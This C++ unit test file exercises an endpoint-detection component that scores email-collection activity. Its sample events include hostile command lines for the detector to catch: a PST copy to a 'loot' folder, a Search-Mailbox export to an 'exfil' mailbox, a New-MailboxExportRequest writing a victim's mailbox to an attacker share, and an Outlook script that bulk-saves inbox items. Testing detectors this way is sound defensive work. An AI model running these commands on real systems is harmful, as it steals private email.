/*
 * email_collection_detector_tests.cpp - Unit tests for
 * EmailCollectionDetector (T1114).
 */
#include "email_collection_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "email_collection_detector.h"

namespace {

#define EM_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "email collection detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kEmailCollectionScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunEmailCollectionDetectorTests() {
    std::fprintf(stderr, "[email] TestDisabled\n");
    {
        edr::EmailCollectionDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\cmd.exe",
            "copy C:\\Users\\bob\\archive.pst C:\\Temp\\loot.pst");
        detector.Enrich(event);
        EM_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[email] TestExMerge\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "C:\\Tools\\ExMerge.exe",
            "exmerge -b -f merge.ini");
        detector.Enrich(event);
        EM_CHECK(Score(event) == "90");
        EM_CHECK(event.fields.at(edr::field::kEmailCollectionVerdict) ==
                 "malicious");
    }
    std::fprintf(stderr, "[email] TestComplianceSearchExport\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event;
        event.type = EDR_EVT_POWERSHELL_SCRIPT;
        event.ts100ns = 1000 * kSecond;
        event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
        event.fields[edr::field::kScriptBlockText] =
            "Search-Mailbox -Identity victim -TargetMailbox "
            "exfil -TargetMailboxFolder \"Loot\"";
        detector.Enrich(event);
        EM_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[email] TestMailboxExportRequest\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event;
        event.type = EDR_EVT_POWERSHELL_SCRIPT;
        event.ts100ns = 1000 * kSecond;
        event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
        event.fields[edr::field::kScriptBlockText] =
            "New-MailboxExportRequest -Mailbox victim -FilePath "
            "\\\\attacker\\share\\victim.pst";
        detector.Enrich(event);
        EM_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[email] TestPstCopyByExternalProcess\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\robocopy.exe",
            "robocopy C:\\Users\\bob\\Documents "
            "C:\\Temp\\loot archive.pst");
        detector.Enrich(event);
        EM_CHECK(Score(event) == "80");
        EM_CHECK(event.fields.at(edr::field::kEmailCollectionVerdict) ==
                 "malicious");
    }
    std::fprintf(stderr, "[email] TestOutlookComBulkExport\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event;
        event.type = EDR_EVT_POWERSHELL_SCRIPT;
        event.ts100ns = 1000 * kSecond;
        event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
        event.fields[edr::field::kScriptBlockText] =
            "$o = New-Object -ComObject Outlook.Application; "
            "$ns = $o.GetNamespace(\"MAPI\"); "
            "$items = $ns.GetDefaultFolder(6).Items; "
            "$items | % { $_.SaveAs(\"C:\\Temp\\\" + $_.Subject + \".msg\") }";
        detector.Enrich(event);
        EM_CHECK(Score(event) == "75");
    }
    std::fprintf(stderr, "[email] TestOutlookItselfSilent\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond,
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
            "OUTLOOK.EXE",
            "outlook.exe /recycle");
        detector.Enrich(event);
        EM_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[email] TestSearchIndexerSilent\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\"
                            "SearchIndexer.exe",
            "searchindexer.exe /Embedding");
        detector.Enrich(event);
        EM_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[email] TestUnrelatedCopySilent\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\cmd.exe",
            "copy C:\\Temp\\report.docx C:\\Backup\\report.docx");
        detector.Enrich(event);
        EM_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[email] TestDedupWindow\n");
    {
        edr::EmailCollectionDetector detector(true, 55, 60, 1024);
        const char* cmd =
            "copy C:\\Users\\bob\\archive.pst C:\\Temp\\loot.pst";
        edr::Event first = ProcEvent(
            1000 * kSecond, "C:\\Windows\\System32\\cmd.exe", cmd);
        detector.Enrich(first);
        EM_CHECK(!Score(first).empty());
        edr::Event second = ProcEvent(
            1030 * kSecond, "C:\\Windows\\System32\\cmd.exe", cmd);
        detector.Enrich(second);
        EM_CHECK(Score(second).empty());
        edr::Event third = ProcEvent(
            1100 * kSecond, "C:\\Windows\\System32\\cmd.exe", cmd);
        detector.Enrich(third);
        EM_CHECK(!Score(third).empty());
    }
    std::fprintf(stderr, "[email] all passed\n");
}
